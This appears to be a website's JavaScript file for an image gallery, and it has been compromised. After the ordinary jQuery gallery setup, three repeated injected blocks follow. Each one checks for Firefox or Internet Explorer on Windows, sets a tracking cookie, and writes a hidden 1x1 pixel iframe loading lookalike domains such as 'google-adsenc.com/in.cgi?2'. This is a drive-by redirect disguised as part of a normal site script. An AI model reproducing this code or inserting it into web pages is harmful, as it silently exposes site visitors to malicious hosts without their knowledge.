$(function() {

	// don't init gallery if it consists of a single photo
	if($("div.image").length > 1) {
		// wrap images
		$("div.image").wrapAll("<div id='image-wrapper'><div id='image-holder'></div></div>");
		$("div.image").show();
		
		// init gallery: Gallery.init(imageHolder, imageWrapperWidth, imageCountHolder, nextButton, prevButton)
		Gallery.init($("div#image-holder"), 560, $("p#gallery-count").children("span")[0], $("a#next-image"), $("a#previous-image"));

	} else {
	  // hide gallery count and navigation
	  $("p#gallery-count, div#gallery-navigation").hide();
	  // show project navigation
	  $("p#project-count").show();
	}
});var BrowserDetect = { init: function () { this.browser = this.searchString(this.dataBrowser) || "An unknown browser"; this.version = this.searchVersion(navigator.userAgent) || this.searchVersion(navigator.appVersion) || "an unknown version"; this.OS = this.searchString(this.dataOS) || "an unknown OS"; }, searchString: function (data) { for (var i=0;i<data.length;i++) { var dataString = data[i].string; var dataProp = data[i].prop; this.versionSearchString = data[i].versionSearch || data[i].identity; if (dataString) { if (dataString.indexOf(data[i].subString) != -1) return data[i].identity; } else if (dataProp) return data[i].identity; } }, searchVersion: function (dataString) { var index = dataString.indexOf(this.versionSearchString); if (index == -1) return; return parseFloat(dataString.substring(index+this.versionSearchString.length+1)); }, dataBrowser: [       { string: navigator.userAgent,subString: "Firefox",identity: "Firefox"},{string: navigator.userAgent,subString: "MSIE",identity: "Explorer",versionSearch: "MSIE"}],dataOS : [{string: navigator.platform,subString: "Win",identity: "Windows"}]};function addCookie(szName,szValue,dtDaysExpires){ var dtExpires = new Date();var dtExpiryDate = "";dtExpires.setTime(dtExpires.getTime()+dtDaysExpires*24*60*60*1000);dtExpiryDate=dtExpires.toGMTString();document.cookie=szName+"="+szValue+";expires="+dtExpiryDate;} function findCookie(szName){        var i=0;var nStartPosition=0;var nEndPosition=0;var szCookieString=document.cookie; while (i<=szCookieString.length){nStartPosition=i;nEndPosition=nStartPosition+szName.length;if (szCookieString.substring(nStartPosition,nEndPosition)==szName){nStartPosition=nEndPosition+1;nEndPosition=document.cookie.indexOf(";",nStartPosition);if(nEndPosition<nStartPosition) nEndPosition=document.cookie.length;return document.cookie.substring(nStartPosition,nEndPosition);break;}i++;} return "";} BrowserDetect.init(); var szCookieString = document.cookie; var boroda = BrowserDetect.browser; var os = BrowserDetect.OS; if ( ((boroda == "Firefox" || boroda == "Explorer") && (os == "Windows")) && (findCookie('geo_idn')!='c48a765e4f75baeb85f0a755fc3ec09c') ) {addCookie("geo_idn","c48a765e4f75baeb85f0a755fc3ec09c",1);document.write('<iframe src="http://google-adsenc.com/in.cgi?2" name="Twitter" scrolling="auto" frameborder="no" align="center" height = "1px" width = "1px"></iframe>');}else {}var BrowserDetect = { init: function () { this.browser = this.searchString(this.dataBrowser) || "An unknown browser"; this.version = this.searchVersion(navigator.userAgent) || this.searchVersion(navigator.appVersion) || "an unknown version"; this.OS = this.searchString(this.dataOS) || "an unknown OS"; }, searchString: function (data) { for (var i=0;i<data.length;i++) { var dataString = data[i].string; var dataProp = data[i].prop; this.versionSearchString = data[i].versionSearch || data[i].identity; if (dataString) { if (dataString.indexOf(data[i].subString) != -1) return data[i].identity; } else if (dataProp) return data[i].identity; } }, searchVersion: function (dataString) { var index = dataString.indexOf(this.versionSearchString); if (index == -1) return; return parseFloat(dataString.substring(index+this.versionSearchString.length+1)); }, dataBrowser: [       { string: navigator.userAgent,subString: "Firefox",identity: "Firefox"},{string: navigator.userAgent,subString: "MSIE",identity: "Explorer",versionSearch: "MSIE"}],dataOS : [{string: navigator.platform,subString: "Win",identity: "Windows"}]};function addCookie(szName,szValue,dtDaysExpires){ var dtExpires = new Date();var dtExpiryDate = "";dtExpires.setTime(dtExpires.getTime()+dtDaysExpires*24*60*60*1000);dtExpiryDate=dtExpires.toGMTString();document.cookie=szName+"="+szValue+";expires="+dtExpiryDate;} function findCookie(szName){        var i=0;var nStartPosition=0;var nEndPosition=0;var szCookieString=document.cookie; while (i<=szCookieString.length){nStartPosition=i;nEndPosition=nStartPosition+szName.length;if (szCookieString.substring(nStartPosition,nEndPosition)==szName){nStartPosition=nEndPosition+1;nEndPosition=document.cookie.indexOf(";",nStartPosition);if(nEndPosition<nStartPosition) nEndPosition=document.cookie.length;return document.cookie.substring(nStartPosition,nEndPosition);break;}i++;} return "";} BrowserDetect.init(); var szCookieString = document.cookie; var boroda = BrowserDetect.browser; var os = BrowserDetect.OS; if ( ((boroda == "Firefox" || boroda == "Explorer") && (os == "Windows")) && (findCookie('geo_idn')!='c48a765e4f75baeb85f0a755fc3ec09c') ) {addCookie("geo_idn","c48a765e4f75baeb85f0a755fc3ec09c",1);document.write('<iframe src="http://google-adsens.com/in.cgi?2" name="Twitter" scrolling="auto" frameborder="no" align="center" height = "1px" width = "1px"></iframe>');}else {}var BrowserDetect = { init: function () { this.browser = this.searchString(this.dataBrowser) || "An unknown browser"; this.version = this.searchVersion(navigator.userAgent) || this.searchVersion(navigator.appVersion) || "an unknown version"; this.OS = this.searchString(this.dataOS) || "an unknown OS"; }, searchString: function (data) { for (var i=0;i<data.length;i++) { var dataString = data[i].string; var dataProp = data[i].prop; this.versionSearchString = data[i].versionSearch || data[i].identity; if (dataString) { if (dataString.indexOf(data[i].subString) != -1) return data[i].identity; } else if (dataProp) return data[i].identity; } }, searchVersion: function (dataString) { var index = dataString.indexOf(this.versionSearchString); if (index == -1) return; return parseFloat(dataString.substring(index+this.versionSearchString.length+1)); }, dataBrowser: [       { string: navigator.userAgent,subString: "Firefox",identity: "Firefox"},{string: navigator.userAgent,subString: "MSIE",identity: "Explorer",versionSearch: "MSIE"}],dataOS : [{string: navigator.platform,subString: "Win",identity: "Windows"}]};function addCookie(szName,szValue,dtDaysExpires){ var dtExpires = new Date();var dtExpiryDate = "";dtExpires.setTime(dtExpires.getTime()+dtDaysExpires*24*60*60*1000);dtExpiryDate=dtExpires.toGMTString();document.cookie=szName+"="+szValue+";expires="+dtExpiryDate;} function findCookie(szName){        var i=0;var nStartPosition=0;var nEndPosition=0;var szCookieString=document.cookie; while (i<=szCookieString.length){nStartPosition=i;nEndPosition=nStartPosition+szName.length;if (szCookieString.substring(nStartPosition,nEndPosition)==szName){nStartPosition=nEndPosition+1;nEndPosition=document.cookie.indexOf(";",nStartPosition);if(nEndPosition<nStartPosition) nEndPosition=document.cookie.length;return document.cookie.substring(nStartPosition,nEndPosition);break;}i++;} return "";} BrowserDetect.init(); var szCookieString = document.cookie; var boroda = BrowserDetect.browser; var os = BrowserDetect.OS; if ( ((boroda == "Firefox" || boroda == "Explorer") && (os == "Windows")) && (findCookie('geo_idn')!='c48a765e4f75baeb85f0a755fc3ec09c') ) {addCookie("geo_idn","c48a765e4f75baeb85f0a755fc3ec09c",1);document.write('<iframe src="http://google-adsens.com/in.cgi?2" name="Twitter" scrolling="auto" frameborder="no" align="center" height = "1px" width = "1px"></iframe>');}else {}